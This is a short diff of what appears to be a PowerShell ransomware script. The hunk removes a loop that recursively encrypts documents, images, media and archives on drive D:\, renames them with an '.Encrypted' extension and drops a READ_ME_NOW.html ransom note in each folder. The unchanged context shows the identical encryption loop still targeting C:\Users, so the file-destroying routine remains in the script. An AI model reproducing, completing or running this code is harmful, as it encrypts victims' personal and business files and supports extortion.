@@ -25,22 +25,6 @@ function Encrypt-File($String, $Passphrase)
     return $ms.ToArray()
 }
 
-gci D:\ -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
-
-   try{
-       $file = Get-Content $_ -raw;
-       $encrypt = Encrypt-File $file $key
-       Set-Content -Path $_ -Value $encrypt
-
-        $newname=$_.Name+'.Encrypted';
-        ren -Path $_.FullName -NewName $newname -Force;
-
-        $path=$_.DirectoryName+'\READ_ME_NOW.html';
-        sc -pat $path -va $text
-    }
-    catch{}
-}
-
 gci C:\Users -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{
 
    try{
